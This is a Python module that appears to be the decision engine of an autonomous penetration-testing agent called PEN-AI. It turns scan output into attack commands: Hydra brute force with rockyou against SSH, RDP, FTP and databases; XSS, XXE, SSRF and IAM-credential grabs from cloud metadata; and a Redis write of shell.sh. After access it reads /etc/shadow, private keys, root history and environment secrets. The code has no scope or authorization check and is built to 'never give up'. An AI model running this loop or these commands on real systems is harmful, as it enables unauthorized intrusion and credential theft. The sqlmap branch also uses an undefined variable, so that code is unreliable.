"""AI Brain v2 - Human-Like Decision Making Engine

This is the CORE intelligence that makes PEN-AI think like a human pentester:
- Analyzes every output and decides what to do next
- Adapts strategy based on what works/fails
- Chains multiple vulnerabilities for maximum impact
- Never gives up until ALL options exhausted
- Learns from each action's result
- Understands context and makes intelligent decisions

No fixed rules. Pure AI reasoning.
"""

import json
import re
from dataclasses import dataclass, field
from typing import Optional, Any
from datetime import datetime


@dataclass
class Action:
    """An action taken by the AI."""
    command: str = ""
    output: str = ""
    exit_code: int = 0
    analysis: str = ""
    next_actions: list = field(default_factory=list)
    success: bool = False
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class Finding:
    """A discovered vulnerability or finding."""
    category: str = ""
    severity: str = "info"
    title: str = ""
    evidence: str = ""
    target: str = ""
    exploitable: bool = False
    exploited: bool = False
    chain_with: list = field(default_factory=list)


class AIBrain:
    """Human-like AI decision making engine.

    This module:
    1. Analyzes command output intelligently
    2. Decides next actions based on findings
    3. Adapts strategy when something fails
    4. Chains vulnerabilities for maximum impact
    5. Tracks progress and never gives up
    6. Makes context-aware decisions
    """

    def __init__(self):
        self.findings: list[Finding] = []
        self.actions: list[Action] = []
        self.failed_commands: set = set()
        self.successful_commands: set = set()
        self.hosts_found: list[str] = []
        self.services_found: dict = {}
        self.credentials_found: list[dict] = []
        self.access_levels: dict = {}
        self.networks_discovered: list[str] = []
        self.phase: str = "recon"
        self.cycle: int = 0
        self.max_cycles: int = 200

    def analyze_output(self, command: str, output: str, exit_code: int) -> dict:
        """Analyze command output and decide next steps.

        This is the CORE of human-like decision making.
        The AI looks at the output and thinks:
        - What did this command find?
        - Is this interesting?
        - What should I do next?
        - Can I chain this with something else?
        """
        analysis = {
            "findings": [],
            "next_actions": [],
            "phase_shift": None,
            "priority": "normal",
        }

        output_lower = output.lower()

        # ─── HOST DISCOVERY ───────────────────────────────────────
        if "nmap" in command and ("-sn" in command or "host" in command.lower()):
            hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)
            new_hosts = [h for h in hosts if h not in self.hosts_found]
            if new_hosts:
                self.hosts_found.extend(new_hosts)
                analysis["findings"].append(Finding(
                    category="recon",
                    severity="info",
                    title=f"Found {len(new_hosts)} new hosts",
                    evidence=", ".join(new_hosts[:10]),
                ))
                # Immediately scan each new host
                for host in new_hosts[:5]:
                    analysis["next_actions"].append(f"nmap -sV -sC -p- {host} --open")

        # ─── PORT/SERVICE DISCOVERY ───────────────────────────────
        elif "nmap" in command and ("-sV" in command or "-p-" in command):
            services = re.findall(r"(\d+)/(tcp|udp)\s+open\s+(\S+)(?:\s+(.*))?", output)
            if services:
                # Extract target host from command
                target_host = ""
                for h in self.hosts_found:
                    if h in command:
                        target_host = h
                        break

                if target_host not in self.services_found:
                    self.services_found[target_host] = []

                for port, proto, svc, ver in services:
                    svc_info = {"port": int(port), "service": svc, "version": ver.strip()}
                    if svc_info not in self.services_found[target_host]:
                        self.services_found[target_host].append(svc_info)

                        # Analyze each service for attack vectors
                        analysis["next_actions"].extend(
                            self._analyze_service(target_host, int(port), svc, ver)
                        )

                analysis["findings"].append(Finding(
                    category="recon",
                    severity="info",
                    title=f"Found {len(services)} services on {target_host}",
                    evidence=json.dumps([f"{s[0]}/{s[2]}" for s in services[:10]]),
                ))

        # ─── VULNERABILITY SCAN ───────────────────────────────────
        elif "vuln" in command.lower() or "vulscan" in command.lower():
            if "vulnerable" in output_lower or "CVE-" in output:
                cves = re.findall(r"(CVE-\d{4}-\d+)", output)
                for cve in cves:
                    analysis["findings"].append(Finding(
                        category="vulnerability",
                        severity="high",
                        title=f"Vulnerability found: {cve}",
                        evidence=output[:500],
                        exploitable=True,
                    ))
                    # Try to exploit this CVE
                    analysis["next_actions"].append(f"searchsploit {cve}")

        # ─── BRUTE FORCE RESULTS ──────────────────────────────────
        elif "hydra" in command or "medusa" in command or "crackmapexec" in command:
            if "success" in output_lower or "password" in output_lower:
                creds = re.findall(r"\[(\S+)\]\[(\S+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S+)", output)
                for protocol, service, host, user, password in creds:
                    cred = {"username": user, "password": password, "service": service, "host": host}
                    self.credentials_found.append(cred)
                    analysis["findings"].append(Finding(
                        category="credential",
                        severity="critical",
                        title=f"Credentials found: {user}:{password}",
                        evidence=f"Service: {service}, Host: {host}",
                        exploitable=True,
                    ))
                    # Try these creds on other services
                    for h, svcs in self.services_found.items():
                        for svc in svcs:
                            if svc["service"] != service:
                                analysis["next_actions"].append(
                                    f"hydra -l {user} -p {password} {svc['service']}://{h} -t 4 -f"
                                )

        # ─── EXPLOITATION RESULTS ─────────────────────────────────
        elif "exploit" in command.lower() or "msfconsole" in command.lower():
            if "success" in output_lower or "session" in output_lower:
                analysis["findings"].append(Finding(
                    category="exploitation",
                    severity="critical",
                    title="Exploitation successful",
                    evidence=output[:500],
                    exploitable=True,
                    exploited=True,
                ))
                # Post-exploitation
                analysis["next_actions"].extend([
                    "whoami",
                    "id",
                    "cat /etc/passwd",
                    "cat /etc/shadow",
                    "find / -perm -u=s -type f 2>/dev/null",
                    "sudo -l",
                    "uname -a",
                    "ip route",
                    "arp -a",
                ])

        # ─── PRIVILEGE ESCALATION ─────────────────────────────────
        elif "privesc" in command.lower() or "linpeas" in command.lower():
            if "root" in output_lower or "uid=0" in output:
                analysis["findings"].append(Finding(
                    category="privesc",
                    severity="critical",
                    title="Root/System access achieved",
                    evidence=output[:500],
                ))
                # Loot everything
                analysis["next_actions"].extend([
                    "cat /etc/shadow",
                    "find / -name id_rsa 2>/dev/null",
                    "find / -name *.key 2>/dev/null",
                    "cat /root/.bash_history",
                    "env",
                    "cat /etc/environment",
                ])

        # ─── CREDENTIAL HARVESTING ────────────────────────────────
        elif "shadow" in command or "history" in command or "config" in command:
            hashes = re.findall(r"(\w+):\$(\d+)\$([^\s:]+)", output)
            for user, hash_type, hash_val in hashes:
                analysis["findings"].append(Finding(
                    category="credential",
                    severity="high",
                    title=f"Password hash: {user}",
                    evidence=f"${hash_type}${hash_val[:30]}...",
                ))

        # ─── SSRF RESULTS ─────────────────────────────────────────
        elif "ssrf" in command.lower() or "169.254.169.254" in command:
            if "ami-" in output or "instance" in output_lower:
                analysis["findings"].append(Finding(
                    category="ssrf",
                    severity="critical",
                    title="AWS metadata accessible via SSRF",
                    evidence=output[:500],
                ))
                # Extract IAM credentials
                analysis["next_actions"].append("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")

        # ─── SQL INJECTION ─────────────────────────────────────────
        elif "sqlmap" in command:
            if "vulnerable" in output_lower or "injection" in output_lower:
                analysis["findings"].append(Finding(
                    category="sqli",
                    severity="critical",
                    title="SQL injection found",
                    evidence=output[:500],
                    exploitable=True,
                ))
                analysis["next_actions"].extend([
                    f"sqlmap -u '{target}' --dbs",
                    f"sqlmap -u '{target}' --tables",
                    f"sqlmap -u '{target}' --dump",
                ])

        # ─── XSS RESULTS ──────────────────────────────────────────
        elif "xss" in command.lower() or "反射" in command:
            if "alert" in output or "script" in output_lower:
                analysis["findings"].append(Finding(
                    category="xss",
                    severity="medium",
                    title="XSS vulnerability found",
                    evidence=output[:300],
                    exploitable=True,
                ))

        # ─── CORS RESULTS ─────────────────────────────────────────
        elif "cors" in command.lower() or "access-control" in command.lower():
            if "evil.com" in output or "*" in output:
                analysis["findings"].append(Finding(
                    category="cors",
                    severity="high",
                    title="CORS misconfiguration",
                    evidence=output[:300],
                ))

        # ─── OPEN REDIRECT ────────────────────────────────────────
        elif "redirect" in command.lower() or "location" in command.lower():
            if "evil.com" in output:
                analysis["findings"].append(Finding(
                    category="redirect",
                    severity="medium",
                    title="Open redirect found",
                    evidence=output[:300],
                    exploitable=True,
                ))

        # ─── SUBDOMAIN TAKEOVER ───────────────────────────────────
        elif "cname" in command.lower() or "takeover" in command.lower():
            if "heroku" in output or "github.io" in output or "amazonaws" in output:
                analysis["findings"].append(Finding(
                    category="takeover",
                    severity="critical",
                    title="Potential subdomain takeover",
                    evidence=output[:300],
                ))

        # ─── GENERIC ERROR ANALYSIS ───────────────────────────────
        if exit_code != 0 and not analysis["next_actions"]:
            # Command failed - AI should try alternative
            analysis["next_actions"] = self._suggest_alternative(command, output)

        # ─── PHASE TRANSITION ─────────────────────────────────────
        analysis["phase_shift"] = self._determine_phase()

        return analysis

    def _analyze_service(self, host: str, port: int, service: str, version: str) -> list:
        """Analyze a service and suggest attack vectors.

        This is where AI thinks like a human:
        - What can I do with this service?
        - What attacks are possible?
        - What should I try first?
        """
        actions = []
        svc_lower = service.lower()

        # SSH
        if "ssh" in svc_lower:
            actions.extend([
                f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f",
                f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f",
                f"hydra -l {host.split('.')[-1]} -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f",
                f"ssh-audit {host} -p {port}",
            ])
            # Check for known SSH vulns
            if version:
                ver_match = re.search(r"(\d+\.\d+)", version)
                if ver_match:
                    ver = float(ver_match.group(1))
                    if ver < 7.4:
                        actions.append(f"searchsploit openssh {version}")

        # HTTP/HTTPS
        elif "http" in svc_lower:
            actions.extend([
                f"nikto -h {host} -p {port}",
                f"gobuster dir -u http://{host}:{port}/ -w /usr/share/wordlists/dirb/common.txt -t 50",
                f"whatweb http://{host}:{port}/",
                f"curl -sI http://{host}:{port}/",
                # Test for common vulns
                f"curl -s 'http://{host}:{port}/robots.txt'",
                f"curl -s 'http://{host}:{port}/.env'",
                f"curl -s 'http://{host}:{port}/.git/config'",
                f"curl -s 'http://{host}:{port}/wp-config.php.bak'",
                # SQL injection
                f"sqlmap -u 'http://{host}:{port}/' --batch --crawl=2",
                # XSS
                f"curl -s 'http://{host}:{port}/search?q=<script>alert(1)</script>'",
                # SSRF
                f"curl -s 'http://{host}:{port}/fetch?url=http://169.254.169.254/'",
                # XXE
                f"curl -s -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' 'http://{host}:{port}/xml'",
                # Open redirect
                f"curl -s -o /dev/null -w '%{{redirect_url}}' -L --max-redirs 0 'http://{host}:{port}/redirect?url=https://evil.com'",
                # CORS
                f"curl -s -I -H 'Origin: https://evil.com' 'http://{host}:{port}/'",
                # Host header
                f"curl -s -H 'Host: evil.com' 'http://{host}:{port}/'",
                # File upload
                f"curl -s -F 'file=@/etc/passwd' 'http://{host}:{port}/upload'",
            ])

        # SMB
        elif "smb" in svc_lower or "microsoft-ds" in svc_lower or "netbios" in svc_lower:
            actions.extend([
                f"smbclient -L {host} -N",
                f"enum4linux -a {host}",
                f"enum4linux -a {host} -u guest",
                f"crackmapexec smb {host} --shares -u guest -p ''",
                f"nmap --script=smb-vuln* -p {port} {host}",
                f"nmap --script=smb-enum-shares -p {port} {host}",
                f"smbmap -H {host}",
            ])

        # FTP
        elif "ftp" in svc_lower:
            actions.extend([
                f"ftp {host}",
                f"nmap --script=ftp-anon -p {port} {host}",
                f"hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://{host} -t 4 -f",
                f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{host} -t 4 -f",
                f"nmap --script=ftp-vuln* -p {port} {host}",
            ])

        # MySQL
        elif "mysql" in svc_lower:
            actions.extend([
                f"mysql -h {host} -u root -p''",
                f"mysql -h {host} -u root -proot",
                f"mysql -h {host} -u admin -padmin",
                f"hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{host} -t 4 -f",
                f"nmap --script=mysql-info -p {port} {host}",
            ])

        # RDP
        elif "rdp" in svc_lower or "ms-wbt" in svc_lower:
            actions.extend([
                f"hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{host} -t 4 -f",
                f"hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://{host} -t 4 -f",
                f"nmap --script=rdp-vuln* -p {port} {host}",
                f"nmap --script=rdp-enum-encryption -p {port} {host}",
            ])

        # LDAP
        elif "ldap" in svc_lower:
            actions.extend([
                f"ldapsearch -x -H ldap://{host} -b '' -s base '(objectclass=*)' namingContexts",
                f"ldapsearch -x -H ldap://{host} -b '' -s base '(objectclass=*)' defaultNamingContexts",
                f"enum4linux -a {host}",
                f"nmap --script=ldap-search -p {port} {host}",
            ])

        # DNS
        elif "dns" in svc_lower or port == 53:
            actions.extend([
                f"dig @{host} axfr",
                f"dig @{host} ANY",
                f"host -t AXFR {host}",
                f"nmap --script=dns-brute -p {port} {host}",
            ])

        # SNMP
        elif "snmp" in svc_lower or port == 161:
            actions.extend([
                f"snmpwalk -v2c -c public {host}",
                f"snmpwalk -v2c -c public {host} 1.3.6.1.2.1.1",
                f"snmp-check {host}",
                f"onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {host}",
            ])

        # Redis
        elif "redis" in svc_lower or port == 6379:
            actions.extend([
                f"redis-cli -h {host} INFO",
                f"redis-cli -h {host} KEYS '*'",
                f"redis-cli -h {host} CONFIG GET dir",
                f"redis-cli -h {host} CONFIG SET dir /tmp",
                f"redis-cli -h {host} CONFIG SET dbfilename shell.sh",
            ])

        # MSSQL
        elif "mssql" in svc_lower or "ms-sql" in svc_lower:
            actions.extend([
                f"hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://{host} -t 4 -f",
                f"impacket-mssqlclient {host} -windows-auth",
                f"nmap --script=ms-sql-info -p {port} {host}",
            ])

        # MongoDB
        elif "mongo" in svc_lower or port == 27017:
            actions.extend([
                f"mongo {host}:{port}",
                f"mongo {host}:{port} --eval 'db.adminCommand({{listDatabases:1}})'",
            ])

        # Default: generic enumeration
        else:
            actions.extend([
                f"nmap -sV -sC -p {port} {host}",
                f"searchsploit {service} {version}",
                f"curl -s {host}:{port}/",
            ])

        return actions

    def _suggest_alternative(self, command: str, output: str) -> list:
        """When a command fails, AI suggests alternatives.

        This is human-like thinking:
        - Why did it fail?
        - What can I try instead?
        - Is there a different tool?
        """
        alternatives = []
        output_lower = output.lower()

        # Connection refused
        if "connection refused" in output_lower or "no route" in output_lower:
            alternatives.append(f"nmap -Pn -p- {command.split()[-1] if command.split() else ''}")

        # Permission denied
        if "permission denied" in output_lower:
            alternatives.append(f"sudo {command}")

        # Tool not found
        if "not found" in output_lower or "no such file" in output_lower:
            # Try alternative tool
            if "nikto" in command:
                alternatives.append(command.replace("nikto", "whatweb"))
            elif "gobuster" in command:
                alternatives.append(command.replace("gobuster", "dirb"))
            elif "hydra" in command:
                alternatives.append(command.replace("hydra", "medusa"))

        # Timeout
        if "timeout" in output_lower:
            alternatives.append(command + " --timeout 60")

        # If nothing specific, try broader scan
        if not alternatives:
            if "nmap" in command:
                alternatives.append(command.replace("-sV", "-sV -sC -A"))

        return alternatives

    def _determine_phase(self) -> str:
        """Determine what phase we should be in.

        Human-like phase transitions:
        - recon → enumeration → exploitation → post-exploit → pivot → loot
        """
        if not self.hosts_found:
            return "recon"
        elif not self.services_found:
            return "enumeration"
        elif not self.credentials_found and not any(v.exploited for v in self.findings):
            return "exploitation"
        elif not any("root" in str(v) for v in self.access_levels.values()):
            return "privesc"
        else:
            return "loot"

    def get_next_actions(self) -> list:
        """Get the next actions to take based on current state.

        This is the CORE decision-making loop.
        AI looks at everything it knows and decides what to do next.
        """
        actions = []

        # Phase-based decision making
        phase = self._determine_phase()

        if phase == "recon":
            # Need more host discovery
            if not self.hosts_found:
                actions.append(f"nmap -sn -T4 {self.target if hasattr(self, 'target') else 'TARGET'}")
            else:
                # Scan discovered hosts more thoroughly
                for host in self.hosts_found[:3]:
                    if host not in self.services_found:
                        actions.append(f"nmap -sV -sC -p- {host} --open")

        elif phase == "enumeration":
            # Deep enumerate each service
            for host, svcs in self.services_found.items():
                for svc in svcs:
                    svc_name = svc.get("service", "")
                    if "http" in svc_name:
                        actions.extend([
                            f"nikto -h {host} -p {svc['port']}",
                            f"gobuster dir -u http://{host}:{svc['port']}/ -w /usr/share/wordlists/dirb/common.txt -t 50",
                        ])
                    elif "ssh" in svc_name:
                        actions.append(f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f")
                    elif "smb" in svc_name:
                        actions.extend([
                            f"enum4linux -a {host}",
                            f"smbclient -L {host} -N",
                        ])

        elif phase == "exploitation":
            # Try to exploit discovered services
            for host, svcs in self.services_found.items():
                for svc in svcs:
                    svc_name = svc.get("service", "")
                    port = svc.get("port", 0)
                    if "http" in svc_name:
                        actions.append(f"sqlmap -u 'http://{host}:{port}/' --batch --crawl=2")
                    elif "ssh" in svc_name:
                        actions.append(f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f")
                    elif "smb" in svc_name:
                        actions.append(f"crackmapexec smb {host} --shares -u guest -p ''")

        elif phase == "privesc":
            # Try privilege escalation
            actions.extend([
                "sudo -l",
                "find / -perm -u=s -type f 2>/dev/null",
                "cat /etc/crontab",
                "ls -la /etc/cron*",
                "uname -a",
            ])

        elif phase == "loot":
            # Harvest everything
            actions.extend([
                "cat /etc/shadow",
                "find / -name id_rsa 2>/dev/null",
                "find / -name *.key 2>/dev/null",
                "cat /root/.bash_history",
                "env",
                "ip route",
                "arp -a",
            ])

        return actions[:10]  # Limit to 10 actions at a time

    def record_action(self, action: Action):
        """Record an action and its result for learning."""
        self.actions.append(action)

        if action.success:
            self.successful_commands.add(action.command)
        else:
            self.failed_commands.add(action.command)

    def get_stats(self) -> dict:
        """Get current engagement statistics."""
        return {
            "cycle": self.cycle,
            "phase": self.phase,
            "hosts": len(self.hosts_found),
            "services": sum(len(svcs) for svcs in self.services_found.values()),
            "credentials": len(self.credentials_found),
            "findings": len(self.findings),
            "critical_findings": len([f for f in self.findings if f.severity == "critical"]),
            "actions_taken": len(self.actions),
            "successful_actions": len(self.successful_commands),
            "failed_actions": len(self.failed_commands),
        }

    def should_stop(self) -> bool:
        """Determine if the engagement should stop.

        AI NEVER stops early unless:
        - Max cycles reached
        - ALL options exhausted on ALL hosts
        - All findings are exploited
        """
        if self.cycle >= self.max_cycles:
            return True

        # Check if we've tried everything
        if self.hosts_found and self.services_found:
            total_services = sum(len(svcs) for svcs in self.services_found.values())
            if len(self.successful_commands) >= total_services * 3:
                # We've tried at least 3 commands per service
                return True

        return False

    def print_status(self):
        """Print current engagement status."""
        stats = self.get_stats()
        print(f"\n  {'='*60}")
        print(f"  AI BRAIN STATUS")
        print(f"  {'='*60}")
        print(f"  Cycle: {stats['cycle']}/{self.max_cycles}")
        print(f"  Phase: {stats['phase']}")
        print(f"  Hosts: {stats['hosts']}")
        print(f"  Services: {stats['services']}")
        print(f"  Credentials: {stats['credentials']}")
        print(f"  Findings: {stats['findings']} ({stats['critical_findings']} critical)")
        print(f"  Actions: {stats['actions_taken']} ({stats['successful_actions']} ok, {stats['failed_actions']} failed)")
        print(f"  {'='*60}")
